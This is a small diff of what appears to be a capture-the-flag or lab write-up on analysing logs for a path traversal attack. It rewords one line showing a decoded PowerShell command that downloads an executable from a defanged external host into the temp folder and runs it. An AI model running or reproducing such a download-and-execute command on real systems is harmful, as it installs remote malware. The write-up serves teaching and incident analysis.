@@ -137,9 +137,7 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 
 <img width="1462" height="16" alt="Q13_1" src="https://github.com/user-attachments/assets/2ffa07d7-3d46-4c45-b1d8-0d51ac47a6b4" />
 
-Once you decode yoou find following code
-
-Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.exe"; Start-Process "$env:TEMP\music.exe" 
+Once you decode you will  find following code " Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.exe"; Start-Process "$env:TEMP\music.exe" "
 ---
 
 ### Task 13
@@ -223,6 +221,7 @@ Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.
 
 > *Screenshot placeholder*
 ---
+
 
 
 
